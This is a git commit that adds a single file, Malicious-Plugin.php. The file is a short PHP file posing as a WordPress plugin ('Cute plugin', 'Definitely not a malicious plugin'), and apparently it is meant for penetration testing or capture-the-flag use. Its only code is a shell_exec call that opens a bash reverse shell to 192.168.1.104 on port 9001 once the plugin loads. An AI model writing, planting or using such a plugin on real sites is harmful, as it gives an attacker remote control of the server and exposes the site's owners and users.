47ed817b31c8cda395f98ff59799c181ca07527d
zAbuQasem <74984708+zAbuQasem@users.noreply.github.com>
2022-05-25 01:17:52 +0300

    Add files via upload

---
+++ Malicious-Plugin.php
@@ -0,0 +1,11 @@
+<?php
+/**
+* Plugin Name: Cute plugin
+* Plugin URI:
+* Description: Definitely not a malicious plugin (i think )
+* Version: 1337.0
+* Author: Zeyad Abulaban
+* Author URI: https://hackers.org
+*/
+shell_exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.104/9001 0>&1'")
+?>
